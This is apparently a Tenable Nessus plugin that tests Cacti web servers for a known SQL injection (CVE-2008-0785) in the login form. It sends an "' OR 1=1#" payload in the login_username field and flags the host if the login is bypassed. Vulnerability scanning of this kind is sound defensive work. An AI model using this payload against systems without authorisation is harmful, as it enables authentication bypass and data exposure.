#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31048);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/10/07 13:30:47 $");

  script_cve_id("CVE-2008-0785");
  script_bugtraq_id(27749);
  script_osvdb_id(41785);

  script_name(english:"Cacti index.php/sql.php Login Action login_username Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a SQL query");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Cacti, a web-based front-end to RRDTool for
network graphing.

The version of Cacti installed on the remote host fails to sanitize
user input to the 'login_username' parameter before using it in the
'auth_login.php' script to perform database queries.  Regardless of
PHP's 'magic_quotes_gpc' setting, an attacker may be able to exploit
this issue to manipulate database queries to disclose sensitive
information, bypass authentication, or even attack the underlying
database.

Note that there are also reportedly several other vulnerabilities
associated with this version of Cacti, although Nessus has not checked
for them." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/160");
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488013/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://forums.cacti.net/about25749.html" );
 script_set_attribute(attribute:"solution", value:"Upgrade to Cacti 0.8.7b / 0.8.6k or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);

 script_set_attribute(attribute:"plugin_publication_date", value:"2008/02/13");

script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("cacti_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cacti");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'cacti', port:port, exit_on_fail:TRUE);
dir = install['dir'];

  # Make sure the script exists.
  url = string(dir, "/index.php/sql.php?action=login");

  r = http_send_recv3(method:"GET",item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If so...
  if ("<title>Login to Cacti" >< res)
  {
    exploit = string(unixtime(), "' OR 1=1#");
    postdata = string("login_username=", urlencode(str:exploit));

    r = http_send_recv3(method: "POST", item: url, port: port,
      content_type:"application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(r)) exit(0);

    # There's a problem if we get a 302 response code.
    if (
      egrep(pattern:"^HTTP/[^ ]+ 302 ", string:r[0]) &&
      egrep(pattern:"^Location: +index\.php", string:r[1])
    )
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
